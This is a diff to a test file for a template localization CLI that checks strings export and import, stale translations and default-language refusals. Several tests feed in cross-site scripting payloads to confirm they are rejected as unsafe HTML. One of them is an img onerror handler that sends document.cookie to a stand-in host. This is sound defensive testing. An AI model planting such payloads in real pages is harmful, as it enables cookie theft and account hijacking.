@@ -3,10 +3,13 @@ import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { join, resolve } from "node:path";
 import { spawnSync } from "node:child_process";
 import {
+  applyOperations,
+  createCustomBlock,
   createDefaultTemplateContent,
   createImageBlock,
   createParagraphBlock,
   sourceHash,
+  type CustomBlockDefinition,
   type LocaleString,
 } from "@templatical/types";
 
@@ -67,7 +70,7 @@ function exported(...args: string[]) {
     templatical: string;
     sourceLocale: string;
     targetLocale: string;
-    strings: LocaleString[];
+    strings: (LocaleString & { previous?: string })[];
   };
 }
 
@@ -149,7 +152,34 @@ describe("strings export", () => {
       source: 'Hello <x id="1"/> Sable',
       sourceHash: sourceHash("Hello {{name}} Sable"),
     });
-    expect(data.strings[1].text).toBe("Alter Text");
+    expect(data.strings[1]).toEqual({
+      id: "stale/content",
+      format: "html",
+      source: "New text",
+      sourceHash: sourceHash("New text"),
+      previous: "Alter Text",
+    });
+  });
+  it("exports a stale entry's translation as previous, without text, under --only all too", () => {
+    expect(exported("--only", "all", "--block", "stale").strings).toEqual([
+      {
+        id: "stale/content",
+        format: "html",
+        source: "New text",
+        sourceHash: sourceHash("New text"),
+        previous: "Alter Text",
+      },
+    ]);
+  });
+  it("refuses the default language with exit 1 and no stdout", () => {
+    const before = readFileSync(file, "utf8");
+    const result = run("export", file, "--locale", "en", "--json");
+    expect(result.status).toBe(1);
+    expect(result.stderr).toContain(
+      `"en" is the default language of ${file}, not a language version.`,
+    );
+    expect(result.stdout).toBe("");
+    expect(readFileSync(file, "utf8")).toBe(before);
   });
   it("includes current translations with --only all and filters by --block", () => {
     expect(exported("--only", "all").strings.map((s) => s.id)).toContain(
@@ -228,6 +258,144 @@ describe("strings export", () => {
 });
 
 describe("strings import", () => {
+  it("applies nothing for a stale entry imported unchanged and never reads previous", () => {
+    const data = exported();
+    const strings = join(dir, "strings.json");
+    write(strings, data);
+    const result = run("import", file, strings, "--json");
+    expect(result.status, result.stderr).toBe(0);
+    expect(JSON.parse(result.stdout)).toEqual({
+      applied: 0,
+      rejected: [],
+      file,
+    });
+    expect(read(file).blocks[1].l10n.de.text.content).toEqual({
+      value: "Alter Text",
+      sourceHash: sourceHash("Old text"),
+    });
+    const stale = data.strings.find((entry) => entry.id === "stale/content")!;
+    data.strings = [
+      { ...stale, previous: "<script>alert(1)</script>", text: "Neuer Text" },
+    ];
+    write(strings, data);
+    const filled = run("import", file, strings, "--json");
+    expect(filled.status, filled.stderr).toBe(0);
+    expect(JSON.parse(filled.stdout).applied).toBe(1);
+    expect(read(file).blocks[1].l10n.de.text.content).toEqual({
+      value: "Neuer Text",
+      sourceHash: sourceHash("New text"),
+    });
+  });
+  it("refuses a strings file exported before another language became the default, writing nothing", () => {
+    const data = exported();
+    for (const entry of data.strings) entry.text = entry.source;
+    const strings = join(dir, "strings.json");
+    write(strings, data);
+    write(
+      file,
+      applyOperations(read(file), [{ op: "setDefaultLocale", locale: "de" }]),
+    );
+    const before = readFileSync(file, "utf8");
+    const result = run("import", file, strings, "--json");
+    expect(result.status).toBe(2);
+    expect(result.stderr).toContain(
+      `${strings} was exported from "en", but the default language of ${file} is "de". Export the strings again.`,
+    );
+    expect(result.stdout).toBe("");
+    expect(readFileSync(file, "utf8")).toBe(before);
+  });
+  it("refuses a strings file that targets the default language with exit 1, writing nothing", () => {
+    const data = exported();
+    data.targetLocale = "en";
+    for (const entry of data.strings) entry.text = entry.source;
+    const strings = join(dir, "strings.json");
+    write(strings, data);
+    const before = readFileSync(file, "utf8");
+    const result = run("import", file, strings, "--json");
+    expect(result.status).toBe(1);
+    expect(result.stderr).toContain(
+      `"en" is the default language of ${file}, not a language version.`,
+    );
+    expect(result.stdout).toBe("");
+    expect(readFileSync(file, "utf8")).toBe(before);
+  });
+  it("rejects markup a text-format source doesn't carry as unsafe_html", () => {
+    const data = exported("--only", "all");
+    data.strings = data.strings.filter((entry) => entry.id === "image/alt");
+    data.strings[0].text = "<img src=x onerror=alert(1)>";
+    const strings = join(dir, "strings.json");
+    write(strings, data);
+    const result = run("import", file, strings, "--json");
+    expect(result.status).toBe(1);
+    expect(JSON.parse(result.stdout)).toEqual({
+      applied: 0,
+      rejected: [{ id: "image/alt", reason: "unsafe_html" }],
+      file,
+    });
+    expect(read(file).blocks[3].l10n).toBeUndefined();
+  });
+  it("checks custom-block text fields from definitions against their source", () => {
+    const definition: CustomBlockDefinition = {
+      type: "welcome",
+      name: "Welcome",
+      fields: [
+        {
+          key: "heading",
+          label: "Heading",
+          type: "text",
+          default: "Use <b> for bold",
+        },
+      ],
+      template: "<p>{{ heading }}</p>",
+    };
+    const definitions = join(dir, "definitions.json");
+    write(definitions, [definition]);
+    const content = fixture();
+    content.blocks = [{ ...createCustomBlock(definition), id: "welcome" }];
+    write(file, content);
+    const strings = join(dir, "strings.json");
+    const exportedFile = run(
+      "export",
+      file,
+      "--locale",
+      "de",
+      "--definitions",
+      definitions,
+    );
+    expect(exportedFile.status, exportedFile.stderr).toBe(0);
+    const data = JSON.parse(exportedFile.stdout);
+    expect(data.strings.map((entry: LocaleString) => entry.id)).toEqual([
+      "welcome/fieldValues.heading",
+    ]);
+    data.strings[0].text = "<img src=x onerror=fetch('//x/'+document.cookie)>";
+    write(strings, data);
+    const unsafe = run(
+      "import",
+      file,
+      strings,
+      "--definitions",
+      definitions,
+      "--json",
+    );
+    expect(unsafe.status).toBe(1);
+    expect(JSON.parse(unsafe.stdout).rejected).toEqual([
+      { id: "welcome/fieldValues.heading", reason: "unsafe_html" },
+    ]);
+    data.strings[0].text = "Nutzen Sie <b> für Fett";
+    write(strings, data);
+    const safe = run(
+      "import",
+      file,
+      strings,
+      "--definitions",
+      definitions,
+      "--json",
+    );
+    expect(safe.status, safe.stderr).toBe(0);
+    expect(read(file).blocks[0].l10n.de.text["fieldValues.heading"].value).toBe(
+      "Nutzen Sie <b> für Fett",
+    );
+  });
   it.each(["</table>", "</mj-text>", "<p>x</div>"])(
     "rejects raw closing markup %s and still applies the accepted string",
     (html) => {
